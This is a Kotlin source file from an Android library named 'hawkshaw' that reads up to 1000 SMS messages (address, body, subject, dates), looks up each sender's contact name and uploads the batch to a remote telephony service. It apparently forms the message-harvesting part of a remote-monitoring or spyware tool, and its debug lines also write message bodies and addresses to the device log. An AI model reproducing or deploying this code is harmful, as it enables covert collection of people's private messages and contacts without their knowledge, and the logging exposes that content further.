package com.hawkshaw.library.features.telephony.messages

import android.content.ContentResolver
import android.content.Context
import android.provider.Telephony
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Message
import com.hawkshaw.library.datalayer.models.PushMessagesRequest
import com.hawkshaw.library.datalayer.models.PushMessagesResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.features.telephony.contacts.getContactName
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import android.util.Log // Added for logging

private const val TAG = "GetMessages"
private const val DEFAULT_LIMIT = 1000

private fun getMessages(contentResolver: ContentResolver, limit: Int): List<Message> {
    Log.d(TAG, "[DEBUG] getMessages called. limit: $limit")
    val messages = ArrayList<Message>()
    val actualLimit = if (limit == -1) Int.MAX_VALUE else limit
    var remaining = actualLimit
    Log.d(TAG, "[DEBUG] getMessages: actualLimit set to $actualLimit, remaining: $remaining")

    val queryUri = Telephony.Sms.CONTENT_URI
    val queryProjection = null // Query all columns
    val querySelection = null
    val querySelectionArgs = null
    val querySortOrder = "date DESC"
    Log.d(TAG, "[DEBUG] getMessages: Querying URI: $queryUri, SortOrder: \"$querySortOrder\"")

    contentResolver.query(
        queryUri,
        queryProjection,
        querySelection,
        querySelectionArgs,
        querySortOrder
    )?.use { cursor ->
        Log.d(TAG, "[DEBUG] getMessages: Cursor obtained. Count: ${cursor.count}")

        // Get column indices
        val idIndex = cursor.getColumnIndex("_id")
        val threadIdIndex = cursor.getColumnIndex("thread_id")
        val addressIndex = cursor.getColumnIndex("address")
        val bodyIndex = cursor.getColumnIndex("body")
        val subjectIndex = cursor.getColumnIndex("subject")
        val typeIndex = cursor.getColumnIndex("type")
        val dateIndex = cursor.getColumnIndex("date")
        val dateSentIndex = cursor.getColumnIndex("date_sent")
        val creatorIndex = cursor.getColumnIndex("creator")
        Log.d(TAG, "[DEBUG] getMessages: Column Indices - _id:$idIndex, thread_id:$threadIdIndex, address:$addressIndex, body:$bodyIndex, subject:$subjectIndex, type:$typeIndex, date:$dateIndex, date_sent:$dateSentIndex, creator:$creatorIndex")

        var rowNum = 0
        while (cursor.moveToNext()) {
            rowNum++
            Log.d(TAG, "[DEBUG] getMessages: Processing row $rowNum.")
            if (remaining <= 0) {
                Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Remaining limit is $remaining. Breaking loop.")
                break
            }
            remaining--

            val id = if (cursor.isNull(idIndex)) "" else cursor.getLong(idIndex).toString()
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw id: $id (isNull: ${cursor.isNull(idIndex)})")

            val threadId = if (cursor.isNull(threadIdIndex)) null else cursor.getInt(threadIdIndex).toString()
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw threadId: $threadId (isNull: ${cursor.isNull(threadIdIndex)})")

            val address = if (cursor.isNull(addressIndex)) "" else cursor.getString(addressIndex) ?: ""
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw address: \"$address\" (isNull: ${cursor.isNull(addressIndex)})")

            val body = if (cursor.isNull(bodyIndex)) "" else cursor.getString(bodyIndex) ?: ""
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw body (first 50 chars): \"${body.take(50)}\" (isNull: ${cursor.isNull(bodyIndex)})")

            val subject = if (cursor.isNull(subjectIndex)) null else cursor.getString(subjectIndex)
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw subject: \"$subject\" (isNull: ${cursor.isNull(subjectIndex)})")

            val typeInt = if (cursor.isNull(typeIndex)) -1 else cursor.getInt(typeIndex) // Default if null or invalid
            val type = if (typeInt == -1) Message.Type.SMS else Message.Type.entries.getOrNull(typeInt) ?: Message.Type.SMS
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw typeInt: $typeInt (isNull: ${cursor.isNull(typeIndex)}), Mapped Type: $type")

            val date = if (cursor.isNull(dateIndex)) 0L else cursor.getLong(dateIndex)
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw date: $date (isNull: ${cursor.isNull(dateIndex)})")

            val dateSent = if (cursor.isNull(dateSentIndex)) null else cursor.getLong(dateSentIndex)
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw dateSent: $dateSent (isNull: ${cursor.isNull(dateSentIndex)})")

            val creator = if (cursor.isNull(creatorIndex)) null else cursor.getString(creatorIndex)
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Raw creator: \"$creator\" (isNull: ${cursor.isNull(creatorIndex)})")

            val contactName = if (address.isNotEmpty()) {
                Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Address is not empty. Calling getContactName for \"$address\".")
                getContactName(contentResolver, address)
            } else {
                Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Address is empty. Setting contactName to \"\".")
                ""
            }
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - contactName: \"$contactName\"")

            val message = Message(
                id = id,
                threadId = threadId,
                address = address,
                contactName = contactName,
                body = body,
                subject = subject,
                type = type,
                date = date,
                dateSent = dateSent,
                creator = creator
            )
            messages.add(message)
            Log.d(TAG, "[DEBUG] getMessages: Row $rowNum - Added Message object: $message")
        }
    } ?: Log.d(TAG, "[DEBUG] getMessages: Query returned null cursor.")
    Log.d(TAG, "[DEBUG] getMessages: Finished processing. Returning ${messages.size} messages.")
    return messages
}

private fun getMessagesWithDefault(contentResolver: ContentResolver, limit: Int = DEFAULT_LIMIT): List<Message> {
    Log.d(TAG, "[DEBUG] getMessagesWithDefault called. Passed limit: $limit, DEFAULT_LIMIT: $DEFAULT_LIMIT")
    val result = getMessages(contentResolver, limit)
    Log.d(TAG, "[DEBUG] getMessagesWithDefault returning ${result.size} messages.")
    return result
}

suspend fun pushMessages(context: Context): ApiResponse<PushMessagesResponse> {
    Log.d(TAG, "[DEBUG] pushMessages called.")
    return withContext(Dispatchers.IO) {
        Log.d(TAG, "[DEBUG] pushMessages: Switched to Dispatchers.IO context.")
        val contentResolver = context.contentResolver
        Log.d(TAG, "[DEBUG] pushMessages: Calling getMessagesWithDefault.")
        val messages = getMessagesWithDefault(contentResolver) // Uses default limit
        Log.d(TAG, "[DEBUG] pushMessages: Retrieved ${messages.size} messages.")

        val request = PushMessagesRequest(messages)
        Log.d(TAG, "[DEBUG] pushMessages: Created PushMessagesRequest with ${request.messages.size} messages.")

        Log.d(TAG, "[DEBUG] pushMessages: Calling Injector.INSTANCE.telephonyService.pushMessages.")
        val response = Injector.INSTANCE.telephonyService.pushMessages(request)
        Log.d(TAG, "[DEBUG] pushMessages: Response from telephonyService: ${response.state}")

        Logger.d( // Existing log
            TAG,
            "PushMessages: ${response.state}",
            false,
            4,
            null
        )
        Log.d(TAG, "[DEBUG] pushMessages: Finished. Returning response.")
        response
    }
}
